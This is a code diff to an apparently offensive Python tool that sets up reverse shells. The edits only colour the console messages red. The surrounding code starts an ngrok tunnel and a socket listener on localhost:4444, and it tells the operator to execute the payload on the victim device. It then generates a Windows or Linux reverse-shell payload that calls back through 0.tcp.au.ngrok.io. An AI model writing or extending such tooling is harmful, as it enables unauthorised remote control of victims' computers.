@@ -23,8 +23,8 @@ def start_ngrok_service():
 
 
 def start_listener():
-    print("\n[!] Listener started.")
-    print("[!] Execute the payload on the victim device.")
+    print(colored("\n[!] Listener started.", "light_red"))
+    print(colored("[!] Execute the payload on the victim device.", "light_red"))
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.bind(("localhost", 4444))
     listener.listen()
@@ -34,10 +34,10 @@ def start_listener():
 
 def generate_payload():
     try:
-        print("[!] In the Ngrok window look for IP:PORT next to forwarding row.")
-        print("\n[!] Copy the PORT and enter it in the console.")
-        port = int(input("\n\nPORT: "))
-        os = input("\nWindows or Linux payload? w/l ")
+        print(colored("[!] In the Ngrok window look for IP:PORT next to forwarding row.", "light_red"))
+        print(colored("\n[!] Copy the PORT and enter it in the console.", "light_red"))
+        port = int(input(colored("\n\nPORT: ", "light_red")))
+        os = input(colored("\nWindows or Linux payload? w/l ", "light_red"))
         if os == "w":
             reverse_shell_gen.windows_payload(ip_addr="0.tcp.au.ngrok.io",
                                               port=port)
@@ -46,8 +46,8 @@ def generate_payload():
                                             port=port)
         
     except ValueError:
-        print("\nPlease input the port you see after EX: 0.tcp.au.ngrok.io")
-        print("\nPort numbers range from 1-65500.")
+        print(colored("\nPlease input the port you see after EX: 0.tcp.au.ngrok.io", "light_red"))
+        print(colored("\nPort numbers range from 1-65500.", "light_red"))
         sleep()
         clear_screen()
         generate_payload()
